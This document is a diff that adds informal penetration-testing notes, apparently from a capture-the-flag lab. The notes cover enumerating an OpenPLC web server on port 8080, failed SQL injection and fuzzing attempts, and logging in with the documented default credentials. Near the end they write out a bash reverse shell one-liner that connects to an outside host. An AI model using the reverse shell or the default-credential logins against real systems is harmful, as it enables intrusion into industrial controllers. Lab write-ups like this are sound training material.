@@ -1,0 +1,83 @@
+nmap scan states that Werkzeug is being used on port 8080. seems to be a web application server
+
+port 22 is also open serving ssh
+
+
+http://10.10.11.7:8080/login
+
+must go to this link because it is serving on 8080
+
+
+POST /login HTTP/1.1
+Host: 10.10.11.7:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://10.10.11.7:8080
+Connection: close
+Referer: http://10.10.11.7:8080/login
+Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zj7bwg.yvycy--S041yNHRipKnYQQ1xMe0
+Upgrade-Insecure-Requests: 1
+
+username=sdte&password=sdfrgh
+
+
+i have to exploit something on that webserver. probablyyyy the formmmm yeaaa
+
+
+when i give it random creds  that dont work, i get a generic:
+
+Bad credentials! Try again
+
+
+lemme look through the source code
+
+nothing interseting in the html
+
+
+im gonna look up if theres any known vulns with the nmap scan details
+
+oh okay so its using python and werkzeug to serve. i wanna know if theres vulns with werkzeug
+
+https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-6808933
+
+unfortunately cant use this cuz theres no one on the other end
+
+
+gonna check if its sql injectable with the form. but while waiting i'll run ffuf
+
+found no sql injections with sqlmap
+
+found no sub doms
+
+hopefully theres something in directory fuzzing cuz otherwise i have no clue
+
+https://autonomylogic.com/docs/2-1-openplc-runtime-overview/
+
+WHY THE HELL omg i shoulda looked at documentation first. DAMN ITTT omg this keeps happening.
+
+
+okay the default creds areee:
+
+The default username and password is openplc (login) and openplc (password). This means that the first thing you must do after logging in for the first time is change the default username and password! It is very easy to do that. Just go to the Users menu on the left and click on the OpenPLC User to change the user information as you like.
+
+so now that im in i checked all the menu items
+
+all seemed relating to the actual functioning of the PLC (programmable logic controller) and i didn't see any exploits there. there was however a file upload section in </>Programs
+
+gonna try a reverse shell in bash. and then start the plc service to get the bash shell to execute. FIRST THOUGHHH DONT FORGET THAT U NEED TO CREATE A LISTENER FIRSTTTTTRFKSjgfsjbg
+
+
+the plc uses linux according to the hardware section. i can definitely use a reverse shell here. i think. well that kinda defeats the whole definitely LMAO
+
+
+alright
+
+bash -i >& /dev/tcp/10.10.16.74/8000 0>&1
+
+okay turns out i cant even upload it cuz it wants stupid st files
+
+
